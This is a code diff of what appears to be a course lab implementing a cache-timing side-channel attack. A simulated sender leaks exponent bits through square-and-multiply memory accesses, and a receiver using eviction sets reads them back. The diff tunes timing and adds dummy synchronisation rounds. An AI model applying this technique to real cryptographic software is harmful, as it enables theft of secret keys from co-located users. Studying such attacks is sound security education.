@@ -27,7 +27,12 @@
 #define SYMBOL_CNT (1 << (sizeof(char) * 8))
 
 // #define EPOCH_LENGTH 2000000. // A very conservative epoch length
-#define EPOCH_LENGTH 20000
+#define EPOCH_LENGTH 10000
+// 20000 = ~14 kB/s
+#define N_EPOCH_START_DELAY 100
+// 40 sometimes works
+// need to run a little to let them sync up
+#define DUMMY_RUNS 30
 
 #define WTD 11
 #define WL2 16
@@ -108,18 +113,24 @@ uint64_t calibrate_latency(){
 void simple_side_channel_sender(uint64_t start_tsc, uint64_t msg_len, uint8_t *page_sqr, uint8_t *page_mul, uint64_t e) {
 	// Function pulled from the professor, for initial validation of attack
     uint64_t next_transmission = start_tsc + EPOCH_LENGTH / 3;
+	_maccess(page_sqr);
     bool transmit_value;
-    for (uint64_t i = 0; i < msg_len; i++) {
+    for (uint64_t i = 0; i < msg_len + DUMMY_RUNS; i++) {
         busy_wait_until(next_transmission);
         next_transmission += EPOCH_LENGTH;
 
         // Sender transmits the information
         _maccess(page_sqr);
-        transmit_value = (e % 2 != 0);
-        if (transmit_value){
-        	_maccess(page_mul);
-        }
-        e /= 2;
+		if (i >= DUMMY_RUNS) {
+			transmit_value = (e % 2 != 0);
+			e /= 2;
+		}
+		else{
+			transmit_value = i % 2;
+		}
+		if (transmit_value){
+			_maccess(page_mul);
+		}
 
 
         // Print the epoch information
@@ -132,7 +143,7 @@ void simple_side_channel_sender(uint64_t start_tsc, uint64_t msg_len, uint8_t *p
 void attack_helper(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, uint8_t cnt){
 	// The helper threads continuously load pages in the EV so they are in shared, to control the replacement policy
 	// stop the helper after a certain number of epochs
-	uint64_t end_tsc = start_tsc + (EPOCH_LENGTH * (msg_len + 1));
+	uint64_t end_tsc = start_tsc + (EPOCH_LENGTH * (msg_len + 1 + DUMMY_RUNS));
 	while (_rdtsc() < end_tsc){
 		for (int i = 0; i < cnt; i++){
 			_maccess(EVtd[i]);
@@ -161,11 +172,11 @@ uint64_t attacker_side_channel(uint64_t start_tsc, uint64_t msg_len, uint8_t **E
 	clock_gettime(CLOCK_MONOTONIC_RAW, &start_stamp);
 
 	//main receiver loop
-	for (uint64_t i = 0; i < msg_len; i++){
+	for (uint64_t i = 0; i < msg_len + DUMMY_RUNS; i++){
 		// evict
 		// TODO THE PAPER MENTIONS ACCESSING THESE 6 TIMES, WHY?
-		busy_wait_until(next_evict);
-		next_evict += EPOCH_LENGTH;
+		// busy_wait_until(next_evict);
+		// next_evict += EPOCH_LENGTH;
 		// for (int j = 0; j < WL2; j ++){
 		//	_maccess(EVl2_mul[j]);
 		// }
@@ -177,7 +188,7 @@ uint64_t attacker_side_channel(uint64_t start_tsc, uint64_t msg_len, uint8_t **E
 			}
 		}
 			*/
-		_lfence();
+		// _lfence();
 		 // tconf->traverse(cands, cnt, tconf);
 
 		// wait for side channel transmission 
@@ -197,11 +208,13 @@ uint64_t attacker_side_channel(uint64_t start_tsc, uint64_t msg_len, uint8_t **E
 		printf("EPOCH: %" PRIu64 "; Receiving: '%d', latency: %lu \n", epoch_id, received_val, lat);
 
 		// save results. Use mask to help
-		if (epoch_id < msg_len){
-			if (received_val){
-				recv_int = recv_int | recv_mask;
+		if (i >= DUMMY_RUNS) {
+			if (epoch_id < msg_len + DUMMY_RUNS){
+				if (received_val){
+					recv_int = recv_int | recv_mask;
+				}
+				recv_mask = recv_mask << 1;
 			}
-			recv_mask = recv_mask << 1;
 		}
 
 	}
@@ -323,7 +336,7 @@ int main(){
 		_lfence();
 		// sizeof returns number of bytes in msg, so multiply by 8 to get the total number of bits
 		uint64_t msg_len = sizeof(uint64_t) * 8;
-		uint64_t start_tsc = (_rdtsc() / EPOCH_LENGTH + 10) * EPOCH_LENGTH + 100 * EPOCH_LENGTH;
+		uint64_t start_tsc = (_rdtsc() / EPOCH_LENGTH + 10) * EPOCH_LENGTH + N_EPOCH_START_DELAY * EPOCH_LENGTH;
 		// attack_helper(start_tsc, msg_len, EVtd);
 		// attack_helper(start_tsc, msg_len, EVtd, cnt_td);
 		// printf("Done with helper\n");
